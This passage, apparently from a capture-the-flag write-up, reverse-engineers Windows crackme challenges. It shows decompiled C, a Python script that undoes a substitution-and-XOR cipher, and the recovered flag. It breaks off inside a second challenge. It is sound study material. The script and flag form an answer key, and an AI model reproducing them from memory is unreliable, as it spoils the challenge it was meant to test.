)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">RegQueryValueExW</span>(hKey, <span class="string">L&quot;Wallpaper&quot;</span>, <span class="number">0</span>, <span class="number">0</span>, Data, &amp;cbData) )</span><br><span class="line">      Type[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">  &#125;</span><br><span class="line">  hdc = <span class="built_in">GetDC</span>(<span class="number">0</span>);</span><br><span class="line">  hdc_1 = <span class="built_in">CreateCompatibleDC</span>(hdc);</span><br><span class="line">  ho = <span class="built_in">CreateCompatibleBitmap</span>(hdc, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">DeleteObject</span>(ho);</span><br><span class="line">  <span class="built_in">DeleteDC</span>(hdc_1);</span><br><span class="line">  <span class="built_in">ReleaseDC</span>(<span class="number">0</span>, hdc);</span><br><span class="line">  n5 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">RegOpenKeyExW</span>(HKEY_CURRENT_USER, <span class="string">L&quot;Software\\FLRSCRNSVR&quot;</span>, <span class="number">0</span>, <span class="number">0x20019u</span>, &amp;phkResult) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">wcscpy_s</span>(Source, <span class="number">0x100u</span>, <span class="string">L&quot;Crackmes.one&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">QueryPerformanceCounter</span>(&amp;PerformanceCount);</span><br><span class="line">    Type[<span class="number">0</span>] = <span class="built_in">sub_140001010</span>() + <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">GetSystemMetrics</span>(<span class="number">0</span>);</span><br><span class="line">    lpcbData = <span class="number">512</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">GetWindowsDirectoryW</span>(Buffer, <span class="number">0x104u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">wcscat_s</span>(Buffer, <span class="number">0x104u</span>, <span class="string">L&quot;*.dll&quot;</span>);</span><br><span class="line">      hFindFile = <span class="built_in">FindFirstFileW</span>(Buffer, &amp;FindFileData);</span><br><span class="line">      <span class="keyword">if</span> ( hFindFile != (HANDLE)<span class="number">-1LL</span> )</span><br><span class="line">        <span class="built_in">FindClose</span>(hFindFile);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">RegQueryValueExW</span>(phkResult, <span class="string">L&quot;Text&quot;</span>, <span class="number">0</span>, Type, (LPBYTE)Source, &amp;lpcbData) )</span><br><span class="line">    &#123;</span><br><span class="line">      hWnd = <span class="built_in">GetDesktopWindow</span>();</span><br><span class="line">      <span class="built_in">IsWindow</span>(hWnd);</span><br><span class="line">      <span class="built_in">wcscpy_s</span>(Source, <span class="number">0x100u</span>, <span class="string">L&quot;Crackmes.one&quot;</span>);</span><br><span class="line">      hdc_2 = <span class="built_in">GetDC</span>(<span class="number">0</span>);</span><br><span class="line">      hdc_3 = <span class="built_in">CreateCompatibleDC</span>(hdc_2);</span><br><span class="line">      ho_1 = <span class="built_in">CreateCompatibleBitmap</span>(hdc_2, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">DeleteObject</span>(ho_1);</span><br><span class="line">      <span class="built_in">DeleteDC</span>(hdc_3);</span><br><span class="line">      <span class="built_in">ReleaseDC</span>(<span class="number">0</span>, hdc_2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v23 = <span class="number">0</span>;</span><br><span class="line">      n5_1 = <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++v23;</span><br><span class="line">        --n5_1;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( n5_1 );</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">wcsnlen</span>(Source, <span class="number">0x100u</span>) )</span><br><span class="line">        <span class="built_in">wcscpy_s</span>(Source, <span class="number">0x100u</span>, <span class="string">L&quot;Crackmes.one&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">GetSystemMetrics</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">RegCloseKey</span>(phkResult);</span><br><span class="line">  &#125;</span><br><span class="line">  n25 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++n25;</span><br><span class="line">  <span class="keyword">while</span> ( Source[n25] );</span><br><span class="line">  <span class="keyword">if</span> ( n25 == <span class="number">25</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v24 = <span class="number">0</span>;</span><br><span class="line">    n5_2 = <span class="number">5</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v24;</span><br><span class="line">      --n5_2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n5_2 );</span><br><span class="line">    <span class="built_in">wcscpy_s</span>(Destination, <span class="number">0x100u</span>, Source);</span><br><span class="line">    Type[<span class="number">0</span>] = <span class="built_in">GetSystemMetrics</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">sub_140001300</span>((__int64)Destination);</span><br><span class="line">    hWnd_1 = <span class="built_in">GetDesktopWindow</span>();</span><br><span class="line">    <span class="built_in">IsWindow</span>(hWnd_1);</span><br><span class="line">    <span class="built_in">sub_140001890</span>(Destination_);</span><br><span class="line">    Type[<span class="number">0</span>] = <span class="built_in">GetSystemMetrics</span>(<span class="number">0</span>);</span><br><span class="line">    v25 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v25;</span><br><span class="line">      --n5;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( n5 );</span><br><span class="line">    p_Destination = Destination;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      v16 = p_Destination[<span class="number">520</span>];</span><br><span class="line">      v17 = *p_Destination - v16;</span><br><span class="line">      <span class="keyword">if</span> ( v17 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      ++p_Destination;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v16 );</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      hdc_4 = <span class="built_in">GetDC</span>(<span class="number">0</span>);</span><br><span class="line">      hdc_5 = <span class="built_in">CreateCompatibleDC</span>(hdc_4);</span><br><span class="line">      ho_2 = <span class="built_in">CreateCompatibleBitmap</span>(hdc_4, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">DeleteObject</span>(ho_2);</span><br><span class="line">      <span class="built_in">DeleteDC</span>(hdc_5);</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">ReleaseDC</span>(<span class="number">0</span>, hdc_4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      h = <span class="built_in">GetStockObject</span>(<span class="number">4</span>);</span><br><span class="line">      result = <span class="built_in">GetObjectW</span>(h, <span class="number">16</span>, &amp;PerformanceCount);</span><br><span class="line">      byte_140008898 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">RegOpenKeyExW</span>(HKEY_CURRENT_USER, <span class="string">L&quot;Control Panel\\Desktop&quot;</span>, <span class="number">0</span>, <span class="number">0x20019u</span>, (PHKEY)Type);</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">RegCloseKey</span>(*(HKEY *)Type);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>The sub_140001300 is the encrypt function:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int16 __fastcall <span class="title">sub_140001300</span><span class="params">(__int64 p_Destination)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dwErrCode[<span class="number">0</span>] = <span class="built_in">GetTickCount</span>() % <span class="number">0x64</span> + <span class="number">5</span>;</span><br><span class="line">  <span class="built_in">SetLastError</span>(dwErrCode[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">wcscpy_s</span>(Destination, <span class="number">0x50u</span>, <span class="string">L&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOP&quot;</span>);</span><br><span class="line">  hWnd = <span class="built_in">GetDesktopWindow</span>();</span><br><span class="line">  <span class="built_in">IsWindow</span>(hWnd);</span><br><span class="line">  <span class="built_in">wcscat_s</span>(Destination, <span class="number">0x50u</span>, <span class="string">L&quot;QRSTUVWXYZ0123456789&#125;_&#123;=-&quot;</span>);</span><br><span class="line">  nSize = <span class="number">32</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">GetComputerNameW</span>(Buffer, &amp;nSize) )</span><br><span class="line">    dwErrCode[<span class="number">0</span>] = Buffer[<span class="number">0</span>];</span><br><span class="line">  <span class="built_in">wcscpy_s</span>(Destination_, <span class="number">0x50u</span>, <span class="string">L&quot;-=&#123;_&#125;9876543210ZYXWVUTSRQPONMLKJIHGF&quot;</span>);</span><br><span class="line">  hdc = <span class="built_in">GetDC</span>(<span class="number">0</span>);</span><br><span class="line">  hdc_1 = <span class="built_in">CreateCompatibleDC</span>(hdc);</span><br><span class="line">  ho = <span class="built_in">CreateCompatibleBitmap</span>(hdc, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">DeleteObject</span>(ho);</span><br><span class="line">  <span class="built_in">DeleteDC</span>(hdc_1);</span><br><span class="line">  <span class="built_in">ReleaseDC</span>(<span class="number">0</span>, hdc);</span><br><span class="line">  hdc_2 = <span class="built_in">GetDC</span>(<span class="number">0</span>);</span><br><span class="line">  hdc_3 = <span class="built_in">CreateCompatibleDC</span>(hdc_2);</span><br><span class="line">  ho_1 = <span class="built_in">CreateCompatibleBitmap</span>(hdc_2, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">DeleteObject</span>(ho_1);</span><br><span class="line">  <span class="built_in">DeleteDC</span>(hdc_3);</span><br><span class="line">  <span class="built_in">ReleaseDC</span>(<span class="number">0</span>, hdc_2);</span><br><span class="line">  <span class="built_in">wcscat_s</span>(Destination_, <span class="number">0x50u</span>, <span class="string">L&quot;EDCBAzyxwvutsrqponmlkjihgfedcba&quot;</span>);</span><br><span class="line">  h = <span class="built_in">GetStockObject</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">GetObjectW</span>(h, <span class="number">16</span>, pv);</span><br><span class="line">  v10 = <span class="number">-1</span>;</span><br><span class="line">  v11 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v11;</span><br><span class="line">  <span class="keyword">while</span> ( *(_WORD *)(p_Destination + <span class="number">2</span> * v11) );</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  n5 = <span class="number">5</span>;</span><br><span class="line">  dwErrCode[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  n5_1 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++dwErrCode[<span class="number">0</span>];</span><br><span class="line">    --n5_1;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( n5_1 );</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v11; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    hWnd_1 = <span class="built_in">GetDesktopWindow</span>();</span><br><span class="line">    <span class="built_in">IsWindow</span>(hWnd_1);</span><br><span class="line">    v17 = <span class="built_in">wcschr</span>(Destination, *(_WORD *)(p_Destination + <span class="number">2</span> * i));</span><br><span class="line">    <span class="keyword">if</span> ( v17 )</span><br><span class="line">    &#123;</span><br><span class="line">      dwErrCode[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      n5_2 = <span class="number">5</span>;</span><br><span class="line">      <span class="keyword">do</span></span><br><span class="line">      &#123;</span><br><span class="line">        ++dwErrCode[<span class="number">0</span>];</span><br><span class="line">        --n5_2;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> ( n5_2 );</span><br><span class="line">      *(_WORD *)(p_Destination + <span class="number">2</span> * i) = Destination_[v17 - Destination];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">RegOpenKeyExW</span>(HKEY_CURRENT_USER, <span class="string">L&quot;Control Panel\\Desktop&quot;</span>, <span class="number">0</span>, <span class="number">0x20019u</span>, &amp;hKey) )</span><br><span class="line">      <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">  &#125;</span><br><span class="line">  h_1 = <span class="built_in">GetStockObject</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">GetObjectW</span>(h_1, <span class="number">16</span>, pv_);</span><br><span class="line">  v32[<span class="number">0</span>] = <span class="string">&#x27;L\0F&#x27;</span>;</span><br><span class="line">  dwErrCode[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    ++dwErrCode[<span class="number">0</span>];</span><br><span class="line">    --n5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( n5 );</span><br><span class="line">  v32[<span class="number">1</span>] = <span class="string">&#x27;R\0A&#x27;</span>;</span><br><span class="line">  v32[<span class="number">2</span>] = <span class="string">&#x27;R\0E&#x27;</span>;</span><br><span class="line">  h_2 = <span class="built_in">GetStockObject</span>(<span class="number">4</span>);</span><br><span class="line">  <span class="built_in">GetObjectW</span>(h_2, <span class="number">16</span>, pv__1);</span><br><span class="line">  TickCount = <span class="built_in">GetTickCount</span>();</span><br><span class="line">  <span class="built_in">SetLastError</span>(TickCount % <span class="number">0x64</span> + <span class="number">5</span>);</span><br><span class="line">  v32[<span class="number">3</span>] = <span class="string">&#x27;L\0A&#x27;</span>;</span><br><span class="line">  v32[<span class="number">4</span>] = <span class="string">&#x27;F&#x27;</span>;</span><br><span class="line">  dwErrCode[<span class="number">0</span>] = <span class="built_in">GetSystemMetrics</span>(<span class="number">0</span>);</span><br><span class="line">  hdc_4 = <span class="built_in">GetDC</span>(<span class="number">0</span>);</span><br><span class="line">  hdc_5 = <span class="built_in">CreateCompatibleDC</span>(hdc_4);</span><br><span class="line">  ho_2 = <span class="built_in">CreateCompatibleBitmap</span>(hdc_4, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">DeleteObject</span>(ho_2);</span><br><span class="line">  <span class="built_in">DeleteDC</span>(hdc_5);</span><br><span class="line">  <span class="built_in">ReleaseDC</span>(<span class="number">0</span>, hdc_4);</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    ++v10;</span><br><span class="line">  <span class="keyword">while</span> ( *((_WORD *)v32 + v10) );</span><br><span class="line">  v25 = <span class="built_in">RegOpenKeyExW</span>(HKEY_CURRENT_USER, <span class="string">L&quot;Control Panel\\Desktop&quot;</span>, <span class="number">0</span>, <span class="number">0x20019u</span>, &amp;phkResult);</span><br><span class="line">  <span class="keyword">if</span> ( !v25 )</span><br><span class="line">    <span class="built_in">LOWORD</span>(v25) = <span class="built_in">RegCloseKey</span>(phkResult);</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v11; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">GetWindowsDirectoryW</span>(FileName, <span class="number">0x104u</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">wcscat_s</span>(FileName, <span class="number">0x104u</span>, <span class="string">L&quot;*.dll&quot;</span>);</span><br><span class="line">      hFindFile = <span class="built_in">FindFirstFileW</span>(FileName, &amp;FindFileData);</span><br><span class="line">      <span class="keyword">if</span> ( hFindFile != (HANDLE)<span class="number">-1LL</span> )</span><br><span class="line">        <span class="built_in">FindClose</span>(hFindFile);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">LOWORD</span>(v25) = *((_WORD *)v32 + j % v10) + j;</span><br><span class="line">    *(_WORD *)(p_Destination + <span class="number">2</span> * j) ^= v25;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v11 &gt;&gt; <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v28 = (_WORD *)(p_Destination - <span class="number">2</span> + <span class="number">2</span> * v11);</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">RegOpenKeyExW</span>(HKEY_CURRENT_USER, <span class="string">L&quot;Control Panel\\Desktop&quot;</span>, <span class="number">0</span>, <span class="number">0x20019u</span>, &amp;hKey) )</span><br><span class="line">        <span class="built_in">RegCloseKey</span>(hKey);</span><br><span class="line">      v29 = *(_WORD *)(p_Destination + <span class="number">2</span> * v12);</span><br><span class="line">      <span class="keyword">if</span> ( <span class="built_in">GetWindowsDirectoryW</span>(FileName, <span class="number">0x104u</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">wcscat_s</span>(FileName, <span class="number">0x104u</span>, <span class="string">L&quot;*.dll&quot;</span>);</span><br><span class="line">        hFindFile_1 = <span class="built_in">FindFirstFileW</span>(FileName, &amp;FindFileData);</span><br><span class="line">        <span class="keyword">if</span> ( hFindFile_1 != (HANDLE)<span class="number">-1LL</span> )</span><br><span class="line">          <span class="built_in">FindClose</span>(hFindFile_1);</span><br><span class="line">      &#125;</span><br><span class="line">      *(_WORD *)(p_Destination + <span class="number">2</span> * v12) = *v28;</span><br><span class="line">      *v28 = v29;</span><br><span class="line">      v25 = <span class="built_in">RegOpenKeyExW</span>(HKEY_CURRENT_USER, <span class="string">L&quot;Control Panel\\Desktop&quot;</span>, <span class="number">0</span>, <span class="number">0x20019u</span>, (PHKEY)dwErrCode);</span><br><span class="line">      <span class="keyword">if</span> ( !v25 )</span><br><span class="line">        <span class="built_in">LOWORD</span>(v25) = <span class="built_in">RegCloseKey</span>(*(HKEY *)dwErrCode);</span><br><span class="line">      ++v12;</span><br><span class="line">      --v28;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> ( v12 &lt; v11 &gt;&gt; <span class="number">1</span> );</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v25;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>This is a substitution-xor key+index-reverse, and the cipher is load in sub_140001890.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">cip = <span class="built_in">bytearray</span>([<span class="number">0x3C</span>, <span class="number">0x51</span>, <span class="number">0x6A</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x07</span>, <span class="number">0x25</span>, <span class="number">0x03</span>, <span class="number">0x30</span>, <span class="number">0x08</span>, <span class="number">0x04</span>, <span class="number">0x29</span>, <span class="number">0x68</span>, <span class="number">0x24</span>, <span class="number">0x01</span>, <span class="number">0x24</span>, <span class="number">0x18</span>, <span class="number">0x6B</span>, <span class="number">0x77</span>, <span class="number">0x0F</span>, <span class="number">0x70</span>, <span class="number">0x36</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x0B</span>])</span><br><span class="line"></span><br><span class="line">U1 = cip[::-<span class="number">1</span>]</span><br><span class="line">key = <span class="string">&quot;FLARERALF&quot;</span></span><br><span class="line">decrypted = []</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>):</span><br><span class="line">    k = <span class="built_in">ord</span>(key[j % <span class="built_in">len</span>(key)]) + j</span><br><span class="line">    c = U1[j] ^ k</span><br><span class="line">    decrypted.append(c)</span><br><span class="line"></span><br><span class="line">src_map  = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#125;_&#123;=-&quot;</span></span><br><span class="line">dst_map  = <span class="string">&quot;-=&#123;_&#125;9876543210ZYXWVUTSRQPONMLKJIHGFEDCBAzyxwvutsrqponmlkjihgfedcba&quot;</span></span><br><span class="line">rev_map = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(dst_map)):</span><br><span class="line">    rev_map[dst_map[i]] = src_map[i]</span><br><span class="line"></span><br><span class="line">flag_chars = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> decrypted:</span><br><span class="line">    ch = <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">if</span> ch <span class="keyword">in</span> rev_map: flag_chars.append(rev_map[ch])</span><br><span class="line">    <span class="keyword">else</span>: flag_chars.append(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(flag_chars)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p><font color=deepskyblue><strong>CMO{frogt4s7ic_r3vers1ng}</strong></font></p>
<h3 id="RecordPlayer"><a href="#RecordPlayer" class="headerlink" title="RecordPlayer"></a>RecordPlayer</h3><p>WinMain:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __stdcall <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, <span class="type">int</span> nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_1400032B0</span>(dwInitParam, hInstance, lpCmdLine, *(_QWORD *)&amp;nShowCmd);</span><br><span class="line">  <span class="built_in">DialogBoxParamW_w</span>((LPARAM)dwInitParam, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_140003570</span>(dwInitParam);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>sub_1400032B0 initialized the interface:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">_QWORD *__fastcall <span class="title">sub_1400032B0</span><span class="params">(_QWORD *p_dwInitParam, HINSTANCE hInstance, __int64 lpCmdLine, __int64 nShowCmd)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  p_dwInitParam_1 = p_dwInitParam;</span><br><span class="line">  <span class="built_in">sub_140002C20</span>(p_dwInitParam, hInstance, <span class="number">101</span>, nShowCmd);</span><br><span class="line">  *p_dwInitParam = &amp;MainDialog::`vftable<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">  v6 = p_dwInitParam + 11;</span></span><br><span class="line"><span class="string">  *(_OWORD *)(p_dwInitParam + 11) = 0;</span></span><br><span class="line"><span class="string">  p_dwInitParam[13] = 0;</span></span><br><span class="line"><span class="string">  p_dwInitParam[14] = 15;</span></span><br><span class="line"><span class="string">  *((_BYTE *)p_dwInitParam + 88) = 0;</span></span><br><span class="line"><span class="string">  v7 = operator new(0x1B8u);</span></span><br><span class="line"><span class="string">  if ( v7 )</span></span><br><span class="line"><span class="string">    v8 = sub_1400016F0(v7);</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string">    v8 = 0;</span></span><br><span class="line"><span class="string">  p_dwInitParam[10] = v8;</span></span><br><span class="line"><span class="string">  v19[0] = &amp;std::_Func_impl_no_alloc&lt;_lambda_254f7f3896517544d5a333cbd1c27e47_,void,std::string const &amp;&gt;::`vftable&#x27;</span>;</span><br><span class="line">  v19[<span class="number">1</span>] = p_dwInitParam;</span><br><span class="line">  v20 = v19;</span><br><span class="line">  v23 = <span class="number">0</span>;</span><br><span class="line">  v23 = (_BYTE *)<span class="built_in">sub_140003A30</span>(v19, v22);</span><br><span class="line">  <span class="built_in">sub_140003AD0</span>((__int64)v22, v8 + <span class="number">208</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v23 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">LOBYTE</span>(v9) = v23 != v22;</span><br><span class="line">    (*(<span class="built_in">void</span> 